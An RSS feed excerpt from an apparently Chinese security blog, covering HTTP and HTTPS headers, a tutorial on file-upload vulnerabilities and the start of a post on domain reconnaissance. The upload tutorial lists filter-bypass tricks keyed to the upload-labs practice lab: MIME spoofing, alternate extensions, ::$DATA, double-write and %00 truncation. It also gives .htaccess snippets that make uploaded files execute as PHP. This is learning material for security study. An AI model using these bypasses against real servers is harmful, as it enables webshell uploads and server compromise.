&lt;td style="text-align: left">Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">User-Agent&lt;/td>
&lt;td style="text-align: left">User-Agent的内容包含发出请求的用户信息&lt;/td>
&lt;td style="text-align: left">User-Agent: Mozilla/5.0 (Linux; X11)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Via&lt;/td>
&lt;td style="text-align: left">通知中间网关或代理服务器地址，通信协议&lt;/td>
&lt;td style="text-align: left">Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">Warning&lt;/td>
&lt;td style="text-align: left">关于消息实体的警告信息&lt;/td>
&lt;td style="text-align: left">Warn: 199 Miscellaneous warning&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="3-http-响应">3. HTTP 响应
&lt;/h3>&lt;p>响应报文与请求报文一样，由三个部分组成(&lt;strong>响应行，响应头，响应体&lt;/strong>)。响应头与响应体之间由空行隔开，每一个请求头之间需要换行。&lt;/p>
&lt;p>浏览器捕捉到的响应头：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span> &lt;span class="m">200&lt;/span> &lt;span class="ne">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Age&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">170477&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">max-age=604800&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html; charset=UTF-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Date&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Sat, 01 May 2021 12:58:12 GMT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Etag&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">&amp;#34;3147526947+ident+gzip&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Expires&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Sat, 08 May 2021 12:58:12 GMT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Last-Modified&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Thu, 17 Oct 2019 07:18:26 GMT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Server&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">ECS (sab/5695)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Vary&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Accept-Encoding&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X-Cache&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">HIT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">648&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="http-响应码">HTTP 响应码
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: left">分类&lt;/th>
&lt;th style="text-align: left">分类描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: left">1**&lt;/td>
&lt;td style="text-align: left">信息，服务器收到请求，需要请求者继续执行操作&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">2**&lt;/td>
&lt;td style="text-align: left">成功，操作被成功接收并处理&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">3**&lt;/td>
&lt;td style="text-align: left">重定向，需要进一步的操作以完成请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">4**&lt;/td>
&lt;td style="text-align: left">客户端错误，请求包含语法错误或无法完成请求&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">5**&lt;/td>
&lt;td style="text-align: left">服务器错误，服务器在处理请求的过程中发生了错误&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h4 id="http-响应头">HTTP 响应头
&lt;/h4>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>响应头&lt;/th>
&lt;th>说明&lt;/th>
&lt;th>示例&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Access-Control-Allow-Origin&lt;/td>
&lt;td>指定哪些网站可以&lt;code>跨域源资源共享&lt;/code>&lt;/td>
&lt;td>&lt;code>Access-Control-Allow-Origin: *&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Accept-Patch&lt;/td>
&lt;td>指定服务器所支持的文档补丁格式&lt;/td>
&lt;td>Accept-Patch: text/example;charset=utf-8&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Accept-Ranges&lt;/td>
&lt;td>服务器所支持的内容范围&lt;/td>
&lt;td>&lt;code>Accept-Ranges: bytes&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Age&lt;/td>
&lt;td>响应对象在代理缓存中存在的时间，以秒为单位&lt;/td>
&lt;td>&lt;code>Age: 12&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Allow&lt;/td>
&lt;td>对于特定资源的有效动作;&lt;/td>
&lt;td>&lt;code>Allow: GET, HEAD&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Cache-Control&lt;/td>
&lt;td>通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒&lt;/td>
&lt;td>&lt;code>Cache-Control: max-age=3600&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Connection&lt;/td>
&lt;td>针对该连接所预期的选项&lt;/td>
&lt;td>&lt;code>Connection: close&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Disposition&lt;/td>
&lt;td>对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。&lt;/td>
&lt;td>Content-Disposition: attachment; filename=&amp;ldquo;fname.ext&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Encoding&lt;/td>
&lt;td>响应资源所使用的编码类型。&lt;/td>
&lt;td>&lt;code>Content-Encoding: gzip&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Language&lt;/td>
&lt;td>响就内容所使用的语言&lt;/td>
&lt;td>&lt;code>Content-Language: zh-cn&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Length&lt;/td>
&lt;td>响应消息体的长度，用8进制字节表示&lt;/td>
&lt;td>&lt;code>Content-Length: 348&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Location&lt;/td>
&lt;td>所返回的数据的一个候选位置&lt;/td>
&lt;td>&lt;code>Content-Location: /index.htm&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-MD5&lt;/td>
&lt;td>响应内容的二进制 MD5 散列值，以 Base64 方式编码&lt;/td>
&lt;td>Content-MD5: IDK0iSsgSW50ZWd0DiJUi==&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Range&lt;/td>
&lt;td>如果是响应部分消息，表示属于完整消息的哪个部分&lt;/td>
&lt;td>Content-Range: bytes 21010-47021/47022&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Content-Type&lt;/td>
&lt;td>当前内容的&lt;code>MIME&lt;/code>类型&lt;/td>
&lt;td>Content-Type: text/html; charset=utf-8&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Date&lt;/td>
&lt;td>此条消息被发送时的日期和时间(以&lt;a class="link" href="http://tools.ietf.org/html/rfc7231#section-7.1.1.1" target="_blank" rel="noopener"
>RFC 7231&lt;/a>中定义的&amp;quot;HTTP日期&amp;quot;格式来表示)&lt;/td>
&lt;td>Date: Tue, 15 Nov 1994 08:12:31 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ETag&lt;/td>
&lt;td>对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列&lt;/td>
&lt;td>ETag: &amp;ldquo;737060cd8c284d8af7ad3082f209582d&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Expires&lt;/td>
&lt;td>指定一个日期/时间，超过该时间则认为此回应已经过期&lt;/td>
&lt;td>Expires: Thu, 01 Dec 1994 16:00:00 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Last-Modified&lt;/td>
&lt;td>所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)&lt;/td>
&lt;td>Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Link&lt;/td>
&lt;td>用来表示与另一个资源之间的类型关系，此类型关系是在&lt;a class="link" href="https://tools.ietf.org/html/rfc5988" target="_blank" rel="noopener"
>RFC 5988&lt;/a>中定义&lt;/td>
&lt;td>&lt;code>Link: &lt;/code>; rel=&amp;ldquo;alternate&amp;rdquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Location&lt;/td>
&lt;td>用于在进行重定向，或在创建了某个新资源时使用。&lt;/td>
&lt;td>Location: &lt;a class="link" href="http://www.itbilu.com/nodejs" target="_blank" rel="noopener"
>http://www.itbilu.com/nodejs&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>P3P&lt;/td>
&lt;td>P3P策略相关设置&lt;/td>
&lt;td>P3P: CP=&amp;ldquo;This is not a P3P policy!&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Pragma&lt;/td>
&lt;td>与具体的实现相关，这些响应头可能在请求/回应链中的不同时候产生不同的效果&lt;/td>
&lt;td>&lt;code>Pragma: no-cache&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Proxy-Authenticate&lt;/td>
&lt;td>要求在访问代理时提供身份认证信息。&lt;/td>
&lt;td>&lt;code>Proxy-Authenticate: Basic&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Public-Key-Pins&lt;/td>
&lt;td>用于防止中间攻击，声明网站认证中传输层安全协议的证书散列值&lt;/td>
&lt;td>Public-Key-Pins: max-age=2592000; pin-sha256=&amp;quot;……&amp;rdquo;;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Refresh&lt;/td>
&lt;td>用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。&lt;/td>
&lt;td>Refresh: 5; url=http://itbilu.com&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Retry-After&lt;/td>
&lt;td>如果某个实体临时不可用，那么此协议头用于告知客户端稍后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。&lt;/td>
&lt;td>示例1:Retry-After: 120示例2: Retry-After: Dec, 26 Dec 2015 17:30:00 GMT&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Server&lt;/td>
&lt;td>服务器的名称&lt;/td>
&lt;td>&lt;code>Server: nginx/1.6.3&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Set-Cookie&lt;/td>
&lt;td>设置&lt;code>HTTP cookie&lt;/code>&lt;/td>
&lt;td>Set-Cookie: UserID=itbilu; Max-Age=3600; Version=1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Status&lt;/td>
&lt;td>通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。&lt;/td>
&lt;td>&lt;code>Status: 200 OK&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Trailer&lt;/td>
&lt;td>&lt;code>Trailer&lt;/code>用户说明传输中分块编码的编码信息&lt;/td>
&lt;td>&lt;code>Trailer: Max-Forwards&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Transfer-Encoding&lt;/td>
&lt;td>用表示实体传输给用户的编码形式。包括：&lt;code>chunked&lt;/code>、&lt;code>compress&lt;/code>、 &lt;code>deflate&lt;/code>、&lt;code>gzip&lt;/code>、&lt;code>identity&lt;/code>。&lt;/td>
&lt;td>Transfer-Encoding: chunked&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Upgrade&lt;/td>
&lt;td>要求客户端升级到另一个高版本协议。&lt;/td>
&lt;td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Vary&lt;/td>
&lt;td>告知下游的代理服务器，应当如何对以后的请求协议头进行匹配，以决定是否可使用已缓存的响应内容而不是重新从原服务器请求新的内容。&lt;/td>
&lt;td>&lt;code>Vary: *&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Via&lt;/td>
&lt;td>告知代理服务器的客户端，当前响应是通过什么途径发送的。&lt;/td>
&lt;td>Via: 1.0 fred, 1.1 itbilu.com (nginx/1.6.3)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Warning&lt;/td>
&lt;td>一般性警告，告知在实体内容体中可能存在错误。&lt;/td>
&lt;td>Warning: 199 Miscellaneous warning&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WWW-Authenticate&lt;/td>
&lt;td>表示在请求获取这个实体时应当使用的认证模式。&lt;/td>
&lt;td>&lt;code>WWW-Authenticate: Basic&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="七https">七、HTTPS
&lt;/h2>&lt;h3 id="1-概念-6">1. 概念
&lt;/h3>&lt;blockquote>
&lt;p>HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。&lt;/p>
&lt;/blockquote>
&lt;h3 id="2-通信流程">2. 通信流程
&lt;/h3>&lt;p>HTTPS通信主要包括几个节点，发起请求、验证身份、协商秘钥、加密会话，具体流程如下（此例子只有客户端对服务端的单向验证）：&lt;/p>
&lt;ol>
&lt;li>客户端向服务端发起建立HTTPS请求：
&lt;ol>
&lt;li>客户端生成随机数R1 发送给服务端；&lt;/li>
&lt;li>客户端告诉服务端自己支持哪些加密算法。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>服务器向客户端发送数字证书:
&lt;ol>
&lt;li>服务端生成随机数R2;&lt;/li>
&lt;li>从客户端支持的加密算法中选择一种双方都支持的加密算法（此算法用于后面的会话密钥生成）;&lt;/li>
&lt;li>服务端生成把证书、随机数R2、会话密钥生成算法，一同发给客户端;&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>客户端验证数字证书，证书验证通过后客户端生成会话密钥（双向验证则此处客户端也会向服务器发送证书）:
&lt;ol>
&lt;li>验证证书的可靠性，先用CA的公钥解密被加密过后的证书,能解密则说明证书没有问题，然后通过证书里提供的摘要算法进行对数据进行摘要，然后通过自己生成的摘要与服务端发送的摘要比对;&lt;/li>
&lt;li>验证证书合法性，包括证书是否吊销、是否到期、域名是否匹配，通过后则进行后面的流程;&lt;/li>
&lt;li>获得证书的公钥、会话密钥生成算法、随机数R2;&lt;/li>
&lt;li>生成一个随机数R3;&lt;/li>
&lt;li>根据会话秘钥算法使用R1、R2、R3生成会话秘钥;&lt;/li>
&lt;li>用服务端证书的公钥加密随机数R3并发送给服务端。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>服务器生成会话密钥（双向验证此处服务端也会对客户端的证书验证）：
&lt;ol>
&lt;li>服务器用私钥解密客户端发过来的随机数R3；&lt;/li>
&lt;li>根据会话秘钥算法使用R1、R2、R3生成会话秘钥。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>客户端与服务端开始进行加密会话。&lt;/li>
&lt;/ol>
&lt;h3 id="3-https-的优缺点">3. HTTPS 的优缺点
&lt;/h3>&lt;h4 id="优点">优点
&lt;/h4>&lt;ol>
&lt;li>使用 HTTPS 协议可认证用户和服务器，确保数据发送到正确的客户机和服务器；&lt;/li>
&lt;li>HTTPS 协议是由 SSL+HTTP构建的可进行加密传输、身份认证的网络协议，要比 HTTP安全，可防止数据在传输过程中被窃取、改变，确保数据的完整性；&lt;/li>
&lt;li>HTTPS 是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。&lt;/li>
&lt;/ol>
&lt;h4 id="缺点">缺点
&lt;/h4>&lt;ol>
&lt;li>相同网络环境下，HTTPS 协议会使页面的加载时间延长近 50%，增加 10%到 20%的耗电。此外，HTTPS 协议还会影响缓存，增加数据开销和功耗；&lt;/li>
&lt;li>HTTPS 协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用；&lt;/li>
&lt;li>最关键的是，SSL 证书的信用链体系并不安全。特别是在某些国家可以控制 CA 根证书的情况下，中间人攻击一样可行；&lt;/li>
&lt;li>成本增加：部署 HTTPS 后，因为 HTTPS 协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。在大规模用户访问应用的场景下，服务器需要频繁地做加密和解密操作，几乎每一个字节都需要做加解密，这就产生了服务器成本。&lt;/li>
&lt;/ol>
&lt;hr>
&lt;blockquote>
&lt;p>​ Reference：&lt;/p>
&lt;ol>
&lt;li>郭浩然. 网站安全之HTTPS优缺点分析&lt;/li>
&lt;li>&lt;a class="link" href="http://tools.jb51.net/table/" target="_blank" rel="noopener"
>脚本之家在线工具 (jb51.net)&lt;/a>&lt;/li>
&lt;/ol>
&lt;/blockquote></description></item><item><title>文件上传漏洞</title><link>https://wlynxg.github.io/blog/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</guid><description>&lt;h1 id="文件上传漏洞">文件上传漏洞
&lt;/h1>&lt;h2 id="概念">概念
&lt;/h2>&lt;blockquote>
&lt;p>文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等。正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回。&lt;/p>
&lt;p>如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了Webshell，则可以拿到Web应用的数据，删除Web文件，本地提权，进一步拿下整个服务器甚至内网。&lt;/p>
&lt;/blockquote>
&lt;h2 id="一验证与绕过">一、验证与绕过
&lt;/h2>&lt;h3 id="1-前端">1. 前端
&lt;/h3>&lt;blockquote>
&lt;p>最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。&lt;/p>
&lt;/blockquote>
&lt;p>对于前端的验证，我们可以通过修改 JS 代码，或者通过抓包的方式绕过验证。&lt;/p>
&lt;p>实例：upload-labs —— Pass-01&lt;/p>
&lt;h2 id="2-服务端">2. 服务端
&lt;/h2>&lt;h3 id="1-mime绕过">1. MIME绕过
&lt;/h3>&lt;blockquote>
&lt;p>MIME(Multipurpose Internet Mail Extensions)：多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型。服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>绕过方式：&lt;/strong>&lt;/p>
&lt;p>通过抓包工具 Burp Suite 进行抓包，修改 Content-Type 字段的值为合法值。&lt;/p>
&lt;p>&lt;strong>Content-Type 对照表&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>数据类型&lt;/th>
&lt;th>Content-Type(Mime-Type)&lt;/th>
&lt;th>数据类型&lt;/th>
&lt;th>Content-Type(Mime-Type)&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>HTML&lt;/td>
&lt;td>text/html&lt;/td>
&lt;td>GIF&lt;/td>
&lt;td>image/gif&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>纯文本&lt;/td>
&lt;td>text/plain&lt;/td>
&lt;td>jpg 图片&lt;/td>
&lt;td>image/jpeg&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>XML&lt;/td>
&lt;td>text/xml&lt;/td>
&lt;td>png 图片&lt;/td>
&lt;td>image/png&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>JSON&lt;/td>
&lt;td>application/json&lt;/td>
&lt;td>PDF&lt;/td>
&lt;td>application/pdf&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>二进制流数据（如常见的文件下载）&lt;/td>
&lt;td>application/octet-stream&lt;/td>
&lt;td>js&lt;/td>
&lt;td>application/x-javascript&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>jsp&lt;/td>
&lt;td>text/html&lt;/td>
&lt;td>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>实例：uploads-labs —— Pass-02&lt;/p>
&lt;h3 id="2-特殊解析后缀">2. 特殊解析后缀
&lt;/h3>&lt;p>一些特殊的后缀名有可能会被相应的服务器解析，在遇到检测文件后缀名的网站时，我们可以通过抓包修改后缀名的方式进行绕过。&lt;/p>
&lt;blockquote>
&lt;p>php：php3、php4、php5、php7、phtml&lt;/p>
&lt;p>jsp：jspx、jspf&lt;/p>
&lt;p>asp：asa、cer&lt;/p>
&lt;/blockquote>
&lt;p>实例：uploads-labs —— Pass-03&lt;/p>
&lt;h3 id="3-上传-htaccess-文件">3. 上传 .htaccess 文件
&lt;/h3>&lt;blockquote>
&lt;p>.htaccess文件(或者&amp;quot;分布式配置文件&amp;quot;）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;/p>
&lt;p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：&lt;/p>
&lt;p>网页301重定向、自定义404错误页面、&lt;em>&lt;strong>改变文件扩展名&lt;/strong>&lt;/em>、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。&lt;/p>
&lt;/blockquote>
&lt;p>假如我们自定义一个规则，并让服务器运行我们定义的规则，便可绕过上传限制。&lt;/p>
&lt;p>&lt;strong>htaccess 文件写法一：&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>AddType application/x-httpd-php .后缀名
# 创建相同后缀名的一句话木马，作用就是会让这个后缀名变成php代码执行
&lt;/code>&lt;/pre>&lt;p>&lt;strong>htaccess 文件写法二：&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code># FileMatch 参数即为文件名的正则匹配
&amp;lt;FilesMatch &amp;#34;xxxx&amp;#34;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code>&lt;/pre>&lt;p>​ 实例：uploads-labs —— Pass-04&lt;/p>
&lt;h3 id="4-大小写绕过">4. 大小写绕过
&lt;/h3>&lt;blockquote>
&lt;p>当服务器没有使用 strtolower() 函数将文件名全部变成小写进行检测时，就可以通过大小写进行绕过检测。&lt;/p>
&lt;p>如：.PHP .Php .PHp 等等&lt;/p>
&lt;/blockquote>
&lt;p>​ 实例：uploads-labs —— Pass-05&lt;/p>
&lt;h3 id="5-空格绕过">5. 空格绕过
&lt;/h3>&lt;blockquote>
&lt;p>Windows 系统会自动去掉后缀名最后的空格，或者服务端不存在 trim($file_name) 用以删除文件名后面的空格，就那么可以通过在文件名后面加空格进行绕过。&lt;/p>
&lt;/blockquote>
&lt;p>​ 实例：uploads-labs —— Pass-07&lt;/p>
&lt;h3 id="6-data绕过">6. ::$DATA绕过
&lt;/h3>&lt;blockquote>
&lt;p>在window的时候如果文件名+&amp;quot;::$DATA&amp;quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名&lt;/p>
&lt;p>例如:&amp;ldquo;phpinfo.php::$DATA&amp;quot;Windows会自动去掉末尾的::$DATA变成&amp;quot;phpinfo.php&amp;rdquo;&lt;/p>
&lt;/blockquote>
&lt;p>实例：uploads-labs —— Pass-09&lt;/p>
&lt;pre>&lt;code>### 7. 点号绕过
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>Windows 系统会自动去掉后缀名最后的**“.”&lt;strong>，或者服务端不存在 deldot($file_name) 用以删除文件名后面的空格，就那么可以通过在文件名后面加&lt;/strong>“.”**进行绕过。&lt;/p>
&lt;/blockquote>
&lt;p>​ 实例：uploads-labs —— Pass-08&lt;/p>
&lt;h3 id="8-双写绕过">8. 双写绕过
&lt;/h3>&lt;blockquote>
&lt;p>str_ireplace(php,&amp;quot;&amp;quot;,pphphp)&lt;/p>
&lt;p>通常出现这个函数往往只会替换一次，那么就可以通过双写后缀名进行绕过：&lt;/p>
&lt;p>pphphp &amp;raquo; php&lt;/p>
&lt;/blockquote>
&lt;p>实例：uploads-labs —— Pass-10&lt;/p>
&lt;h3 id="9-00-截断">9. 00 截断
&lt;/h3>&lt;blockquote>
&lt;p>0x00，%00，/00之类的截断，都是一样的，只是不同表示而已。&lt;/p>
&lt;p>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制，&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>%00 截断的使用条件：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>php版本必须小于5.3.4 且 php.ini中的 magic_quotes_gpc设置为Off&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>原理：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。&lt;/p>
&lt;p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束 0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制 。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>效果：&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>demo.php%00.jpg &amp;raquo; demo.php&lt;/p>
&lt;/blockquote>
&lt;p>实例：uploads-labs —— Pass-11&lt;/p></description></item><item><title>信息收集——域名信息获取</title><link>https://wlynxg.github.io/blog/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/</guid><description>&lt;h1 id="信息手机域名信息获取">信息手机——域名信息获取
&lt;/h1>&lt;h1 id="一域名介绍">一、域名介绍
&lt;/h1>&lt;h3 id="1-域名定义">1. 域名定义
&lt;/h3>&lt;p>域名（Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识。&lt;/p>
&lt;h3 id="2-域名与ip">2. 域名与IP
&lt;/h3>&lt;p>当我们访问一个网址时，我们既可以通过它的域名进行访问，也可以通过直接输入它的服务器的IP地址进行访问，那么为什么我们大多数都是用的域名而不是用IP地址呢？
这是因为IP地址不方便记忆，且不能显示地址组织的名称和性质。因此人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。
&lt;strong>举个例子：&lt;/strong>
